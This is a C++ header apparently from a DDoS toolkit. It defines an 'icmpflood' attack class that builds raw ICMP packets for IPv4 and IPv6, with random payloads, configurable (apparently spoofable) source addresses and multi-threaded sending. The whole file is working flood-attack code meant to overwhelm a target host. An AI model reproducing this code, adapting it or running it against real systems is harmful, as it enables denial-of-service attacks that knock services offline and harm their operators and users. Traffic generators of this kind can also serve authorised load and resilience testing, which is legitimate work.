#ifndef _ICMP_ATK_H
#define _ICMP_ATK_H
#include "pktbuild.h"

class CIcmpAtk : public CAttack {
public:
	CIcmpAtk():CAttack(){
		strncpy(m_name, "icmpflood", 31);
	}
	CIcmpAtk(const CDDoSParam& param) :CAttack(param){
		strncpy(m_name, "icmpflood", 31);
		char payload[ATTACK_BUF_LEN] = {0};
		if(m_params.m_payload_len>0 && m_params.m_payload_data==NULL){
			rand_str(payload, m_params.m_payload_len);
			m_params.set_payload_data(payload, m_params.m_payload_len);
		}
		m_params.m_iph_proto = IPPROTO_ICMP;
	}
	virtual ~CIcmpAtk(){
	}
	pdu_l3_desc_t get_layer3_info(){

		pdu_l3_desc_t layer3;

		layer3.vlanid = m_params.m_vlan_id;
		layer3.dstaddr = get_cur_dstaddr();
		layer3.srcaddr = get_cur_srcaddr();
		layer3.dstaddr6 = get_cur_dstaddr6();
		layer3.srcaddr6 = get_cur_srcaddr6();	
		layer3.identity = m_params.m_identity;
		layer3.ttl = m_params.m_ttl;

		layer3.dont_frag = m_params.m_dont_frag;
		layer3.dport = get_cur_dstport();
		layer3.sport = get_cur_srcport();
		layer3.payload_len = m_params.m_payload_len;
		layer3.icmptype = m_params.m_icmp_type;
		layer3.ip_type = m_params.m_ip_type;
		layer3.iph_proto = m_params.m_iph_proto;
		layer3.layer3_total_len = m_params.m_payload_len;
		return layer3;
	}
	
	int32_t attack_one_pkt(int thrd_index){
		pdu_l3_desc_t layer3 =get_layer3_info();
	    if(m_params.m_ip_type==IP_V4){
			
			RC_LOG_INFO("CIcmpAtk.h attack_one_pkt layer3.icmptype = %d \n", layer3.icmptype);
			uint32_t pkt_len = modify_icmp(&layer3, m_pkt_buf[thrd_index], ATTACK_BUF_LEN, NULL);
		    sendpkt( layer3.dstaddr,  layer3.dport,  pkt_len,  thrd_index);
		}else{

	        int c = 0;


			//char payload[56];
			
			//for (int i=0; i<56; i++) payload[i]='A'+((char)(i%26));
			
			libnet_build_icmpv4_echo(layer3.icmptype,0,0,1,0, (uint8_t*)m_params.m_payload_data, m_params.m_payload_len,m_libnet,0);
            libnet_build_ipv6(
            	0,
            	0,
				LIBNET_ICMPV6_H + m_params.m_payload_len,
		        IPPROTO_ICMP6,
	            64,
	            layer3.srcaddr6,
	            layer3.dstaddr6,
                NULL,/*payload*/
                0,/*paylen*/
                m_libnet,
                0);
			
	        char srcname[255]={0};
			libnet_addr2name6_r(layer3.srcaddr6,1,srcname,255);
			char dstname[255]={0};
			libnet_addr2name6_r(layer3.dstaddr6,1,dstname,255);
			RC_LOG_INFO("%15s/%5d -> %15s /%5d\n", srcname,layer3.sport,dstname,layer3.dport);
			
			c = libnet_write(m_libnet);
            if (c == -1)
            {
                RC_LOG_INFO( "libnet_write: %s\n", libnet_geterror(m_libnet));
            }	
			libnet_clear_packet(m_libnet);
	
		}

		return 0;
	}

	int32_t start(){
		RC_LOG_INFO("CIcmpAtk.h start is called \n");

		uint32_t ii = 0;
	 	pdu_l3_desc_t layer3 = get_layer3_info();
	 

		RC_LOG_INFO("CIcmpAtk.h start layer3.icmptype = %d \n", layer3.icmptype);

		for (ii = 0; ii < g_thrd_cnt; ii++)
		{
			m_fd[ii] = init_raw_udp_socket();
			if (m_fd[ii] == -1)
			{
				return RC_ERROR;
			}
            if(m_params.m_ip_type == IP_V4){
				m_pkt_buf[ii] = (char*)malloc(ATTACK_BUF_LEN);
				modify_icmp(&layer3, m_pkt_buf[ii], ATTACK_BUF_LEN, m_params.m_payload_data);
			}else{

				char errbuf[LIBNET_ERRBUF_SIZE];
				m_libnet= libnet_init(LIBNET_RAW6, /* injection type */
									NULL, /* network interface */
									errbuf); /* error buffer */
				if (m_libnet == NULL)
				{				
				
					RC_LOG_ERROR("libnet_init() failed: %s", errbuf);				
				
				}	
				libnet_seed_prand(m_libnet);

			}
		
		}
		return RC_OK;
	}
	void stop(){
		common_free();
	}


	uint32_t modify_icmp(pdu_l3_desc_t *pdu_desc, char *buffer, uint32_t buffer_len, char* payload)
	{
		int send_len = 0;
		
		//IP_HEADER_T *iphdr = NULL;
		ICMP_HEADER_T *icmphdr = NULL;

		send_len += copy_ip_header(buffer, buffer_len, pdu_desc);


		icmphdr = (ICMP_HEADER_T*)&buffer[send_len];

		icmphdr->icmp_type = pdu_desc->icmptype;
		icmphdr->icmp_code = 0;
		icmphdr->icmp_Id = 1;
		icmphdr->icmp_Seq = 1;
		icmphdr->icmp_sum = 0;


		send_len += sizeof(ICMP_HEADER_T);

		if (pdu_desc->payload_len > 0)
		{
			if (payload != NULL)
			{
				util_memcpy(&buffer[send_len], payload, pdu_desc->payload_len);
			}
			else
			{
				/*payload不变*/
			}

			send_len += pdu_desc->payload_len;
		}
		icmphdr->icmp_sum = compute_icmp_checksum(icmphdr, sizeof(ICMP_HEADER_T)+pdu_desc->payload_len);
		return send_len;
	}

private:
	uint16_t compute_icmp_checksum(ICMP_HEADER_T *icmp_header, uint16_t icmp_len)
	{
		return in_chksum_icmp((uint16_t *)icmp_header, icmp_len);
	}

	static inline uint16_t in_chksum_icmp(uint16_t *d, uint16_t dlen)
	{
		// icmp的checksum不需要对
		unsigned int cksum = 0;
		unsigned short answer = 0;

		while (dlen > 1)
		{
			cksum += *d++;
			dlen -= 2;
		}

		if (dlen == 1)
		{
			*(unsigned char *)(&answer) = (*(unsigned char *)d);
			cksum += answer;
		}
		//将32位数转换成16   
		cksum = (cksum >> 16) + (cksum & 0x0000ffff);
		cksum += (cksum >> 16);

		return (unsigned short)(~cksum);
	}
	
};
#endif